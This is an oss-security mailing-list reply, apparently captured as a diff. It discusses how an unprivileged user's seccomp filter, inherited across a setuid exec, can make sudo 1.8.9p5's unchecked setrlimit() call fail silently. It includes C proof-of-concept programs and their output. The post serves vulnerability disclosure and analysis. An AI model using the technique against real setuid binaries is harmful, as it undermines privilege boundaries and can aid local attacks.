@@ -1,0 +1,124 @@
+
+Date: Sun, 08 Jan 2017 12:51:58 +0100
+From: Martin Carpenter <mcarpenter@...e.fr>
+To: oss-security@...ts.openwall.com
+Subject: Re: Re: Firejail local root exploit
+
+On Sat, 2017-01-07 at 14:21 +0100, Martin Carpenter wrote:
+> prctl(PR_CAPBSET_DROP, ...) (see caps.c) requires CAP_SETPCAP. 
+
+Oops, I was looking at the wrong flag: PR_SECCOMP_SET doesn't require
+capabilities. Thanks sivmu.
+
+So that... doesn't improve things, quite the opposite. Here's
+disable_coredumps() from sudo 1.8.9p5 (as shipped with Ubuntu 14.04,
+which does not disable suid coredumps on desktop by default):
+
+ 784 /*
+ 785  * Disable core dumps to avoid dropping a core with user password
+in it.
+ 786  * We will reset this limit before executing the command.
+ 787  * Not all operating systems disable core dumps for setuid
+processes.
+ 788  */
+ 789 static void
+ 790 disable_coredumps(void)
+ 791 {
+ 792 #if defined(RLIMIT_CORE)
+ 793     struct rlimit rl;
+ 794     debug_decl(disable_coredumps, SUDO_DEBUG_UTIL)
+ 795 
+ 796     /*
+ 797      * Turn off core dumps?
+ 798      */
+ 799     if (sudo_conf_disable_coredump()) {
+ 800     (void) getrlimit(RLIMIT_CORE, &corelimit);
+ 801     memcpy(&rl, &corelimit, sizeof(struct rlimit));
+ 802     rl.rlim_cur = 0;
+ 803     (void) setrlimit(RLIMIT_CORE, &rl);
+ 804     }
+ 805     debug_return;
+ 806 #endif /* RLIMIT_CORE */
+ 807 }
+
+The return value from setrlimit() at line 803 is not checked.
+
+PoC: two programs (below): foo, to set up a seccomp filter (using
+libseccomp) to fail calls to setrlimit() and then fork/exec bar, which
+duplicates disable_coredumps() above, setuid-root, 4755. All works as
+expected: a non-privileged user can prevent the call to setrlimit() in
+privileged bar and execution continues. (The filter is inherited since
+calls to fork, exec are not blocked).
+
+Again we can probably push root cause off to sudo's failure to check the
+setrlimit() return value (or Ubuntu's defaults...) but pragmatically
+there just has to be more stuff out there like this. sudo was literally
+the first thing I looked at... Disabling filter inheritance across the
+privilege boundary doesn't seem like an obviously good solution(?).
+
+OpenBSD's pledge(2), by contrast, only sends uncatchable-SIGABRT and
+pledges are not inherited by subprocesses, privileged or not.
+
+
+$ cat foo.c
+
+#include <linux/seccomp.h>
+#include <seccomp.h>
+#include <stdio.h>
+#include <sys/prctl.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <unistd.h>
+
+int main(int argc, const char *argv[])
+{
+  int status;
+  char *args[] = { "./bar", NULL };
+  scmp_filter_ctx ctx;
+  switch(fork()) {
+      case -1: /* error */
+          perror("fork");
+          return 1;
+          break;
+      case 0: /* child */
+          ctx = seccomp_init(SCMP_ACT_ALLOW); // permit all
+          seccomp_rule_add(ctx, SCMP_ACT_ERRNO(1), SCMP_SYS(setrlimit),
+0); // blacklist setrlimit
+          seccomp_load(ctx);
+          execv(args[0], args);
+          perror("execv");
+          _exit(1);
+          break;
+      default:
+          if(-1 == wait(&status)) {
+              perror("wait");
+              return 1;
+          }
+          printf("exit code %d\n", WEXITSTATUS(status));
+  }
+  return 0; 
+}
+$ cat bar.c
+
+#include <sys/time.h>
+#include <sys/resource.h>
+#include <string.h>
+
+int main(int argc, const char *argv[])
+{
+    struct rlimit rl;
+    struct rlimit corelimit;
+    (void) getrlimit(RLIMIT_CORE, &corelimit);
+    memcpy(&rl, &corelimit, sizeof(struct rlimit));
+    rl.rlim_cur = 0;
+    return setrlimit(RLIMIT_CORE, &rl) ? 2 : 0;
+}
+$ gcc -o foo foo.c -lseccomp
+$ gcc -o bar bar.c
+$ sudo chown root bar
+$ sudo chmod 4755 bar
+$ ./foo 
+exit code 2
+$
+
+
